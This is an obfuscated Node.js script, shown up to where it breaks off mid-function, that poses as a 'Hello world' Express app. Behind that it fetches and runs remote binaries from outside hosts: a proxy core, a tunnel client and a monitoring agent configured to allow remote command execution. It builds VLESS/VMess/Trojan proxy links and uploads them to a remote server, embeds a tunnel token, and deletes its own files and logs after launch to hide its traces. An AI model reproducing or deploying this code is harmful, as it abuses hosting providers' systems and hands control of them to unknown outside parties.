const _0x2b3be8=_0x152a;(function(_0x4086f3,_0x1df97d){const _0x46dc23=_0x152a,_0x3dd908=_0x4086f3();while(!![]){try{const _0x284b1b=parseInt(_0x46dc23(0x18f))/0x1+-parseInt(_0x46dc23(0x223))/0x2+-parseInt(_0x46dc23(0x18a))/0x3+-parseInt(_0x46dc23(0x221))/0x4+-parseInt(_0x46dc23(0x1c0))/0x5*(-parseInt(_0x46dc23(0x1b9))/0x6)+-parseInt(_0x46dc23(0x1ea))/0x7*(parseInt(_0x46dc23(0x1d5))/0x8)+parseInt(_0x46dc23(0x1fe))/0x9;if(_0x284b1b===_0x1df97d)break;else _0x3dd908['push'](_0x3dd908['shift']());}catch(_0x276afa){_0x3dd908['push'](_0x3dd908['shift']());}}}(_0x1097,0xda1d3));const express=require('express'),app=express(),axios=require(_0x2b3be8(0x176)),os=require('os'),fs=require('fs'),path=require(_0x2b3be8(0x1b1)),{promisify}=require(_0x2b3be8(0x1ce)),exec=promisify(require(_0x2b3be8(0x1f1))[_0x2b3be8(0x1fb)]),{execSync}=require(_0x2b3be8(0x1f1)),UPLOAD_URL=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x189)]||'',PROJECT_URL=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x1ca)]||'',AUTO_ACCESS=process['env'][_0x2b3be8(0x20f)]||![],FILE_PATH=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x212)]||_0x2b3be8(0x1e6),SUB_PATH=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x1e8)]||'sub',PORT=process[_0x2b3be8(0x1fc)]['SERVER_PORT']||process[_0x2b3be8(0x1fc)][_0x2b3be8(0x18d)]||0xbb8,UUID=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x175)]||_0x2b3be8(0x220),NEZHA_SERVER=process[_0x2b3be8(0x1fc)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x1b3)]||'',NEZHA_KEY=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x222)]||'',ARGO_DOMAIN=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x1dd)]||_0x2b3be8(0x188),ARGO_AUTH=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x232)]||_0x2b3be8(0x1d9),ARGO_PORT=process['env'][_0x2b3be8(0x1cc)]||0x1f41,CFIP=process[_0x2b3be8(0x1fc)]['CFIP']||_0x2b3be8(0x1ee),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x2b3be8(0x1fc)][_0x2b3be8(0x1a5)]||'';!fs[_0x2b3be8(0x236)](FILE_PATH)?(fs[_0x2b3be8(0x1ba)](FILE_PATH),console[_0x2b3be8(0x19b)](FILE_PATH+_0x2b3be8(0x22e))):console[_0x2b3be8(0x19b)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4ad958=_0x2b3be8,_0x756dd8=_0x4ad958(0x1b5);let _0x1bd282='';for(let _0x5ca2ac=0x0;_0x5ca2ac<0x6;_0x5ca2ac++){_0x1bd282+=_0x756dd8[_0x4ad958(0x19a)](Math['floor'](Math['random']()*_0x756dd8[_0x4ad958(0x1b0)]));}return _0x1bd282;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2b3be8(0x1e5)](FILE_PATH,npmName),phpPath=path[_0x2b3be8(0x1e5)](FILE_PATH,phpName),webPath=path[_0x2b3be8(0x1e5)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2b3be8(0x1e5)](FILE_PATH,_0x2b3be8(0x1ed)),listPath=path[_0x2b3be8(0x1e5)](FILE_PATH,_0x2b3be8(0x235)),bootLogPath=path[_0x2b3be8(0x1e5)](FILE_PATH,'boot.log'),configPath=path[_0x2b3be8(0x1e5)](FILE_PATH,_0x2b3be8(0x22d));function deleteNodes(){const _0x36c756=_0x2b3be8;try{if(!UPLOAD_URL)return;if(!fs[_0x36c756(0x236)](subPath))return;let _0xf73424;try{_0xf73424=fs[_0x36c756(0x193)](subPath,'utf-8');}catch{return null;}const _0x1d50a7=Buffer[_0x36c756(0x228)](_0xf73424,'base64')[_0x36c756(0x1de)]('utf-8'),_0x1d871=_0x1d50a7[_0x36c756(0x190)]('\x0a')[_0x36c756(0x201)](_0x18a134=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x36c756(0x17a)](_0x18a134));if(_0x1d871[_0x36c756(0x1b0)]===0x0)return;return axios[_0x36c756(0x1a3)](UPLOAD_URL+_0x36c756(0x1bf),JSON['stringify']({'nodes':_0x1d871}),{'headers':{'Content-Type':_0x36c756(0x213)}})[_0x36c756(0x1c8)](_0x2d38d9=>{return null;}),null;}catch(_0x2b9810){return null;}}function cleanupOldFiles(){const _0x515d36=_0x2b3be8;try{const _0x7d86a1=fs[_0x515d36(0x1d0)](FILE_PATH);_0x7d86a1[_0x515d36(0x17f)](_0x1d4d9b=>{const _0x139f5a=_0x515d36,_0x69a280=path[_0x139f5a(0x1e5)](FILE_PATH,_0x1d4d9b);try{const _0x1041f7=fs[_0x139f5a(0x17b)](_0x69a280);_0x1041f7[_0x139f5a(0x17d)]()&&fs['unlinkSync'](_0x69a280);}catch(_0x7cd2e){}});}catch(_0x1aa19a){}}app[_0x2b3be8(0x191)]('/',function(_0x1fc876,_0x2e9195){const _0x2e251c=_0x2b3be8;_0x2e9195[_0x2e251c(0x1b8)](_0x2e251c(0x1c5));});async function generateConfig(){const _0x4de023=_0x2b3be8,_0x58aa97={'log':{'access':_0x4de023(0x1c4),'error':_0x4de023(0x1c4),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x4de023(0x238),'fallbacks':[{'dest':0xbb9},{'path':_0x4de023(0x1e4),'dest':0xbba},{'path':_0x4de023(0x204),'dest':0xbbb},{'path':_0x4de023(0x181),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4de023(0x1f2),'protocol':_0x4de023(0x1c7),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x4de023(0x238)}},{'port':0xbba,'listen':_0x4de023(0x1f2),'protocol':_0x4de023(0x1c7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4de023(0x238)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4de023(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x4de023(0x18c),_0x4de023(0x1fa),_0x4de023(0x1d1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4de023(0x1f2),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4de023(0x204)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4de023(0x1fa),_0x4de023(0x1d1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4de023(0x1f2),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4de023(0x238),'wsSettings':{'path':_0x4de023(0x181)}},'sniffing':{'enabled':!![],'destOverride':[_0x4de023(0x18c),_0x4de023(0x1fa),_0x4de023(0x1d1)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4de023(0x178),'tag':_0x4de023(0x182)},{'protocol':_0x4de023(0x1ac),'tag':_0x4de023(0x202)}]};fs[_0x4de023(0x198)](path[_0x4de023(0x1e5)](FILE_PATH,'config.json'),JSON[_0x4de023(0x217)](_0x58aa97,null,0x2));}function _0x152a(_0xbf66a3,_0x263e74){_0xbf66a3=_0xbf66a3-0x173;const _0x1097d3=_0x1097();let _0x152a10=_0x1097d3[_0xbf66a3];return _0x152a10;}function getSystemArchitecture(){const _0x9c2bc2=_0x2b3be8,_0x1cd61d=os[_0x9c2bc2(0x1f7)]();return _0x1cd61d===_0x9c2bc2(0x199)||_0x1cd61d===_0x9c2bc2(0x1a0)||_0x1cd61d==='aarch64'?_0x9c2bc2(0x199):_0x9c2bc2(0x209);}function downloadFile(_0x2723ce,_0x574930,_0x1973ad){const _0xa9c43f=_0x2b3be8,_0x1a7867=_0x2723ce;!fs[_0xa9c43f(0x236)](FILE_PATH)&&fs[_0xa9c43f(0x1ba)](FILE_PATH,{'recursive':!![]});const _0x2fb638=fs[_0xa9c43f(0x194)](_0x1a7867);axios({'method':_0xa9c43f(0x191),'url':_0x574930,'responseType':'stream'})[_0xa9c43f(0x1cd)](_0x323d37=>{const _0x56fe99=_0xa9c43f;_0x323d37[_0x56fe99(0x219)]['pipe'](_0x2fb638),_0x2fb638['on']('finish',()=>{const _0x5d3031=_0x56fe99;_0x2fb638[_0x5d3031(0x197)](),console[_0x5d3031(0x19b)]('Download\x20'+path[_0x5d3031(0x1cb)](_0x1a7867)+_0x5d3031(0x1a2)),_0x1973ad(null,_0x1a7867);}),_0x2fb638['on']('error',_0x5d5bf9=>{const _0x227f20=_0x56fe99;fs[_0x227f20(0x195)](_0x1a7867,()=>{});const _0xe9d249=_0x227f20(0x1cf)+path['basename'](_0x1a7867)+_0x227f20(0x19c)+_0x5d5bf9['message'];console[_0x227f20(0x22b)](_0xe9d249),_0x1973ad(_0xe9d249);});})['catch'](_0x3bea6e=>{const _0xba35fc=_0xa9c43f,_0x774480=_0xba35fc(0x1cf)+path['basename'](_0x1a7867)+_0xba35fc(0x19c)+_0x3bea6e['message'];console[_0xba35fc(0x22b)](_0x774480),_0x1973ad(_0x774480);});}async function downloadFilesAndRun(){const _0x5623ef=_0x2b3be8,_0x307efa=getSystemArchitecture(),_0xa01c5c=getFilesForArchitecture(_0x307efa);if(_0xa01c5c[_0x5623ef(0x1b0)]===0x0){console[_0x5623ef(0x19b)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x34afd0=_0xa01c5c[_0x5623ef(0x17e)](_0x4e5206=>{return new Promise((_0x152b35,_0x53b847)=>{const _0x5b8ff2=_0x152a;downloadFile(_0x4e5206[_0x5b8ff2(0x203)],_0x4e5206[_0x5b8ff2(0x20e)],(_0x154b87,_0x34cf84)=>{_0x154b87?_0x53b847(_0x154b87):_0x152b35(_0x34cf84);});});});try{await Promise[_0x5623ef(0x1a9)](_0x34afd0);}catch(_0x194e83){console[_0x5623ef(0x22b)](_0x5623ef(0x1f0),_0x194e83);return;}function _0x1fcc05(_0x1a19c3){const _0x3a5b20=_0x5623ef,_0x54c525=0x1fd;_0x1a19c3[_0x3a5b20(0x17f)](_0x492183=>{fs['existsSync'](_0x492183)&&fs['chmod'](_0x492183,_0x54c525,_0x570bce=>{const _0x237b8b=_0x152a;_0x570bce?console[_0x237b8b(0x22b)](_0x237b8b(0x1d2)+_0x492183+':\x20'+_0x570bce):console[_0x237b8b(0x19b)]('Empowerment\x20success\x20for\x20'+_0x492183+':\x20'+_0x54c525[_0x237b8b(0x1de)](0x8));});});}const _0x4b8f69=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1fcc05(_0x4b8f69);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x42abb3=NEZHA_SERVER[_0x5623ef(0x21b)](':')?NEZHA_SERVER[_0x5623ef(0x190)](':')[_0x5623ef(0x206)]():'',_0x5466ac=new Set([_0x5623ef(0x1bc),_0x5623ef(0x229),_0x5623ef(0x1dc),_0x5623ef(0x180),'2083',_0x5623ef(0x1f8)]),_0x45b8fe=_0x5466ac['has'](_0x42abb3)?'true':_0x5623ef(0x1af),_0x43114b=_0x5623ef(0x1d7)+NEZHA_KEY+_0x5623ef(0x1a7)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x45b8fe+_0x5623ef(0x1a6)+UUID;fs[_0x5623ef(0x198)](path[_0x5623ef(0x1e5)](FILE_PATH,'config.yaml'),_0x43114b);const _0x3dc247=_0x5623ef(0x1eb)+phpPath+_0x5623ef(0x1bd)+FILE_PATH+_0x5623ef(0x216);try{await exec(_0x3dc247),console[_0x5623ef(0x19b)](phpName+_0x5623ef(0x1ae)),await new Promise(_0x58b51d=>setTimeout(_0x58b51d,0x3e8));}catch(_0x5b76b2){console[_0x5623ef(0x22b)](_0x5623ef(0x215)+_0x5b76b2);}}else{let _0x3ae85f='';const _0x39494b=['443',_0x5623ef(0x229),_0x5623ef(0x1dc),'2087',_0x5623ef(0x1f5),_0x5623ef(0x1f8)];_0x39494b[_0x5623ef(0x21b)](NEZHA_PORT)&&(_0x3ae85f=_0x5623ef(0x21a));const _0x1aaede='nohup\x20'+npmPath+_0x5623ef(0x205)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5623ef(0x1c9)+NEZHA_KEY+'\x20'+_0x3ae85f+_0x5623ef(0x21d);try{await exec(_0x1aaede),console[_0x5623ef(0x19b)](npmName+_0x5623ef(0x1ae)),await new Promise(_0xbd46f4=>setTimeout(_0xbd46f4,0x3e8));}catch(_0x5d3cf0){console[_0x5623ef(0x22b)](_0x5623ef(0x225)+_0x5d3cf0);}}}else console[_0x5623ef(0x19b)](_0x5623ef(0x1f3));const _0x2528c9=_0x5623ef(0x1eb)+webPath+_0x5623ef(0x218)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2528c9),console[_0x5623ef(0x19b)](webName+_0x5623ef(0x1ae)),await new Promise(_0x28e1d3=>setTimeout(_0x28e1d3,0x3e8));}catch(_0x25362d){console[_0x5623ef(0x22b)](_0x5623ef(0x1bb)+_0x25362d);}if(fs[_0x5623ef(0x236)](botPath)){let _0x2177c2;if(ARGO_AUTH[_0x5623ef(0x1f9)](/^[A-Z0-9a-z=]{120,250}$/))_0x2177c2=_0x5623ef(0x233)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2177c2=_0x5623ef(0x21c)+FILE_PATH+_0x5623ef(0x1c3):_0x2177c2=_0x5623ef(0x20c)+FILE_PATH+_0x5623ef(0x1e1)+ARGO_PORT;try{await exec(_0x5623ef(0x1eb)+botPath+'\x20'+_0x2177c2+_0x5623ef(0x227)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x2cf7c5=>setTimeout(_0x2cf7c5,0x7d0));}catch(_0x1f303c){console[_0x5623ef(0x22b)](_0x5623ef(0x211)+_0x1f303c);}}await new Promise(_0x5de91b=>setTimeout(_0x5de91b,0x1388));}function _0x1097(){const _0x2ba1c7=['countryCode','sub.txt','cdns.doon.eu.org','listen','Error\x20downloading\x20files:','child_process','127.0.0.1','NEZHA\x20variable\x20is\x20empty,skip\x20running','push','2083','tunnel.yml','arch','2053','match','tls','exec','env','base64','24709860frAskX','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','filter','block','fileName','/vmess-argo','\x20-s\x20','pop','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/agent','amd','utf-8','Subscription\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http\x20server\x20is\x20running\x20on\x20port:','fileUrl','AUTO_ACCESS','https://arm64.ssss.nyc.mn/agent','Error\x20executing\x20command:\x20','FILE_PATH','application/json','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','php\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','stringify','\x20-c\x20','data','--tls','includes','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','org','App\x20is\x20running','4bc4471a-7947-4070-96c0-89dd3e143d3f','3413400SbVQdU','NEZHA_KEY','1648830jjTkwG','country_code','npm\x20running\x20error:\x20','del\x20/f\x20/q\x20','\x20>/dev/null\x202>&1\x20&','from','8443','https://oooo.serv00.net/add-url','error','https://arm64.ssss.nyc.mn/bot','config.json','\x20is\x20created','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/api/add-subscriptions','Content-Type','ARGO_AUTH','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20credentials-file:\x20','list.txt','existsSync','ArgoDomain:','none','&path=%2Fvless-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/web','UUID','axios','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','freedom','win32','test','statSync','Error\x20in\x20startserver:','isFile','map','forEach','2087','/trojan-argo','direct','pkill\x20-f\x20\x22[','TunnelSecret','tunnel.json','&fp=firefox&type=ws&host=','message','mxd.229881.xyz','UPLOAD_URL','3820347eGjCAZ','?security=tls&sni=','http','PORT','response','1273988wiCALC','split','get','firefox','readFileSync','createWriteStream','unlink','https://arm64.ssss.nyc.mn/v1','close','writeFileSync','arm','charAt','log','\x20failed:\x20','\x20>/dev/null\x202>&1','Add\x20automatic\x20access\x20task\x20faild:\x20','unshift','arm64','unlinkSync','\x20successfully','post','boot.log','NAME','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','rm\x20-rf\x20','all','&path=%2Ftrojan-argo%3Fed%3D2560#','platform','blackhole','taskkill\x20/f\x20/im\x20','\x20is\x20running','false','length','path','clear','NEZHA_PORT','https://amd64.ssss.nyc.mn/v1','abcdefghijklmnopqrstuvwxyz','\x20>\x20nul\x202>&1','https://ipapi.co/json/','send','309294rsatWc','mkdirSync','web\x20running\x20error:\x20','443','\x20-c\x20\x22','success','/api/delete-nodes','85ocFOAT','http://ip-api.com/json/','https://arm64.ssss.nyc.mn/web','/tunnel.yml\x20run','/dev/null','Hello\x20world!','?encryption=none&security=tls&sni=','vless','catch','\x20-p\x20','PROJECT_URL','basename','ARGO_PORT','then','util','Download\x20','readdirSync','quic','Empowerment\x20failed\x20for\x20','set','\x0a\x20\x20\x20\x20','15632YzNvre','.exe\x20>\x20nul\x202>&1','\x0aclient_secret:\x20','/api/add-nodes','eyJhIjoiYjhhMDMzN2U0ZjY3NzIyMmU1Y2VlZWYwYWRkOGJiYzEiLCJ0IjoiY2I1NTZkY2MtMjM0YS00Y2M1LWFhODItOTY1YTg0MDA4OTQ2IiwicyI6IlpXVTJaR0l4T0RZdE5tWXlOeTAwTWpCakxXSXhaR1V0WW1ZM04ySmxaalZsTlRBeSJ9','status','/sub.txt\x20saved\x20successfully','2096','ARGO_DOMAIN','toString','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ARGO_DOMAIN:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/bot','/vless-argo','join','./tmp','Skipping\x20adding\x20automatic\x20access\x20task','SUB_PATH','substring','3766KIymIQ','nohup\x20'];_0x1097=function(){return _0x2ba1c7;};return _0x1097();}function getFilesForArchitecture(_0x254333){const _0x360288=_0x2b3be8;let _0x21f4cd;_0x254333===_0x360288(0x199)?_0x21f4cd=[{'fileName':webPath,'fileUrl':_0x360288(0x1c2)},{'fileName':botPath,'fileUrl':_0x360288(0x22c)}]:_0x21f4cd=[{'fileName':webPath,'fileUrl':_0x360288(0x174)},{'fileName':botPath,'fileUrl':_0x360288(0x1e3)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3850b1=_0x254333===_0x360288(0x199)?_0x360288(0x210):_0x360288(0x208);_0x21f4cd[_0x360288(0x19f)]({'fileName':npmPath,'fileUrl':_0x3850b1});}else{const _0x3b7678=_0x254333==='arm'?_0x360288(0x196):_0x360288(0x1b4);_0x21f4cd[_0x360288(0x19f)]({'fileName':phpPath,'fileUrl':_0x3b7678});}}return _0x21f4cd;}function argoType(){const _0x3ec70c=_0x2b3be8;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3ec70c(0x19b)](_0x3ec70c(0x214));return;}if(ARGO_AUTH[_0x3ec70c(0x21b)](_0x3ec70c(0x184))){fs['writeFileSync'](path[_0x3ec70c(0x1e5)](FILE_PATH,_0x3ec70c(0x185)),ARGO_AUTH);const _0x3abab6='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3ec70c(0x190)]('\x22')[0xb]+_0x3ec70c(0x234)+path[_0x3ec70c(0x1e5)](FILE_PATH,_0x3ec70c(0x185))+_0x3ec70c(0x22f)+ARGO_DOMAIN+_0x3ec70c(0x200)+ARGO_PORT+_0x3ec70c(0x1ff);fs[_0x3ec70c(0x198)](path[_0x3ec70c(0x1e5)](FILE_PATH,_0x3ec70c(0x1f6)),_0x3abab6);}else console[_0x3ec70c(0x19b)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x502ff9=_0x2b3be8;let _0x37b8cc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x37b8cc=ARGO_DOMAIN,console['log'](_0x502ff9(0x1e0),_0x37b8cc),await _0x1ae9ff(_0x37b8cc);else try{const _0x153804=fs['readFileSync'](path[_0x502ff9(0x1e5)](FILE_PATH,_0x502ff9(0x1a4)),_0x502ff9(0x20a)),_0x4221ca=_0x153804[_0x502ff9(0x190)]('\x0a'),_0x4703ad=[];_0x4221ca[_0x502ff9(0x17f)](_0x3610be=>{const _0x2f009d=_0x502ff9,_0x4c2b05=_0x3610be['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4c2b05){const _0x20ca23=_0x4c2b05[0x1];_0x4703ad[_0x2f009d(0x1f4)](_0x20ca23);}});if(_0x4703ad[_0x502ff9(0x1b0)]>0x0)_0x37b8cc=_0x4703ad[0x0],console['log'](_0x502ff9(0x237),_0x37b8cc),await _0x1ae9ff(_0x37b8cc);else{console[_0x502ff9(0x19b)](_0x502ff9(0x177)),fs[_0x502ff9(0x1a1)](path['join'](FILE_PATH,_0x502ff9(0x1a4)));async function _0xede8a9(){const _0x5d1924=_0x502ff9;try{process[_0x5d1924(0x1ab)]===_0x5d1924(0x179)?await exec(_0x5d1924(0x1ad)+botName+_0x5d1924(0x1d6)):await exec(_0x5d1924(0x183)+botName[_0x5d1924(0x19a)](0x0)+']'+botName[_0x5d1924(0x1e9)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0xcd5415){}}_0xede8a9(),await new Promise(_0x49655f=>setTimeout(_0x49655f,0xbb8));const _0x176ae1=_0x502ff9(0x20c)+FILE_PATH+_0x502ff9(0x1e1)+ARGO_PORT;try{await exec(_0x502ff9(0x1eb)+botPath+'\x20'+_0x176ae1+_0x502ff9(0x227)),console['log'](botName+_0x502ff9(0x1ae)),await new Promise(_0x2552c8=>setTimeout(_0x2552c8,0xbb8)),await extractDomains();}catch(_0x3c6ca8){console[_0x502ff9(0x22b)](_0x502ff9(0x211)+_0x3c6ca8);}}}catch(_0x55e203){console[_0x502ff9(0x22b)]('Error\x20reading\x20boot.log:',_0x55e203);}async function _0x504618(){const _0x40cc80=_0x502ff9;try{const _0x555686=await axios[_0x40cc80(0x191)](_0x40cc80(0x1b7),{'timeout':0xbb8});if(_0x555686[_0x40cc80(0x219)]&&_0x555686[_0x40cc80(0x219)][_0x40cc80(0x224)]&&_0x555686['data'][_0x40cc80(0x21e)])return _0x555686[_0x40cc80(0x219)][_0x40cc80(0x224)]+'_'+_0x555686[_0x40cc80(0x219)][_0x40cc80(0x21e)];}catch(_0x46c645){try{const _0x28f614=await axios[_0x40cc80(0x191)](_0x40cc80(0x1c1),{'timeout':0xbb8});if(_0x28f614[_0x40cc80(0x219)]&&_0x28f614[_0x40cc80(0x219)][_0x40cc80(0x1da)]===_0x40cc80(0x1be)&&_0x28f614[_0x40cc80(0x219)][_0x40cc80(0x1ec)]&&_0x28f614[_0x40cc80(0x219)]['org'])return _0x28f614['data'][_0x40cc80(0x1ec)]+'_'+_0x28f614['data'][_0x40cc80(0x21e)];}catch(_0x332a0a){}}return'Unknown';}async function _0x1ae9ff(_0x59623e){const _0x848601=await _0x504618(),_0x3623ef=NAME?NAME+'-'+_0x848601:_0x848601;return new Promise(_0xae2f4f=>{setTimeout(()=>{const _0x5f4b50=_0x152a,_0x2b3d6d={'v':'2','ps':''+_0x3623ef,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5f4b50(0x238),'net':'ws','type':_0x5f4b50(0x238),'host':_0x59623e,'path':_0x5f4b50(0x207),'tls':_0x5f4b50(0x1fa),'sni':_0x59623e,'alpn':'','fp':_0x5f4b50(0x192)},_0xf41e4d='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5f4b50(0x1c6)+_0x59623e+'&fp=firefox&type=ws&host='+_0x59623e+_0x5f4b50(0x173)+_0x3623ef+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x5f4b50(0x217)](_0x2b3d6d))[_0x5f4b50(0x1de)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5f4b50(0x18b)+_0x59623e+_0x5f4b50(0x186)+_0x59623e+_0x5f4b50(0x1aa)+_0x3623ef+_0x5f4b50(0x1d4);console[_0x5f4b50(0x19b)](Buffer[_0x5f4b50(0x228)](_0xf41e4d)[_0x5f4b50(0x1de)](_0x5f4b50(0x1fd))),fs[_0x5f4b50(0x198)](subPath,Buffer[_0x5f4b50(0x228)](_0xf41e4d)[_0x5f4b50(0x1de)](_0x5f4b50(0x1fd))),console[_0x5f4b50(0x19b)](FILE_PATH+_0x5f4b50(0x1db)),uploadNodes(),app[_0x5f4b50(0x191)]('/'+SUB_PATH,(_0x2db0cf,_0x28c1dd)=>{const _0x10585c=_0x5f4b50,_0x5d9756=Buffer[_0x10585c(0x228)](_0xf41e4d)[_0x10585c(0x1de)](_0x10585c(0x1fd));_0x28c1dd[_0x10585c(0x1d3)](_0x10585c(0x231),_0x10585c(0x1e2)),_0x28c1dd['send'](_0x5d9756);}),_0xae2f4f(_0xf41e4d);},0x7d0);});}}async function uploadNodes(){const _0x211ae6=_0x2b3be8;if(UPLOAD_URL&&PROJECT_URL){const _0x4391d0=PROJECT_URL+'/'+SUB_PATH,_0x591d5f={'subscription':[_0x4391d0]};try{const _0x357504=await axios[_0x211ae6(0x1a3)](UPLOAD_URL+_0x211ae6(0x230),_0x591d5f,{'headers':{'Content-Type':_0x211ae6(0x213)}});return _0x357504&&_0x357504[_0x211ae6(0x1da)]===0xc8?(console[_0x211ae6(0x19b)](_0x211ae6(0x20b)),_0x357504):null;}catch(_0x1153b8){if(_0x1153b8[_0x211ae6(0x18e)]){if(_0x1153b8[_0x211ae6(0x18e)][_0x211ae6(0x1da)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xf8b2a5=fs[_0x211ae6(0x193)](listPath,_0x211ae6(0x20a)),_0x2a824d=_0xf8b2a5[_0x211ae6(0x190)]('\x0a')[_0x211ae6(0x201)](_0x737003=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x211ae6(0x17a)](_0x737003));if(_0x2a824d['length']===0x0)return;const _0x10cc45=JSON['stringify']({'nodes':_0x2a824d});try{const _0x40bcf2=await axios[_0x211ae6(0x1a3)](UPLOAD_URL+_0x211ae6(0x1d8),_0x10cc45,{'headers':{'Content-Type':_0x211ae6(0x213)}});return _0x40bcf2&&_0x40bcf2[_0x211ae6(0x1da)]===0xc8?(console[_0x211ae6(0x19b)]('Nodes\x20uploaded\x20successfully'),_0x40bcf2):null;}catch(_0x44b87e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x39c0c7=_0x152a,_0x53b148=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x53b148['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x53b148[_0x39c0c7(0x1f4)](phpPath);process[_0x39c0c7(0x1ab)]===_0x39c0c7(0x179)?exec(_0x39c0c7(0x226)+_0x53b148[_0x39c0c7(0x1e5)]('\x20')+_0x39c0c7(0x1b6),_0x52e3eb=>{const _0xf7ab3f=_0x39c0c7;console[_0xf7ab3f(0x1b2)](),console['log'](_0xf7ab3f(0x21f)),console[_0xf7ab3f(0x19b)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x39c0c7(0x1a8)+_0x53b148[_0x39c0c7(0x1e5)]('\x20')+_0x39c0c7(0x19d),_0x5947c7=>{const _0x189d1f=_0x39c0c7;console['clear'](),console[_0x189d1f(0x19b)](_0x189d1f(0x21f)),console[_0x189d1f(0x19b)](_0x189d1f(0x1df));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3efd8b=_0x2b3be8;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3efd8b(0x1e7));return;}try{const _0x2aed4c=await axios[_0x3efd8b(0x1a3)](_0x3efd8b(0x22a),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return 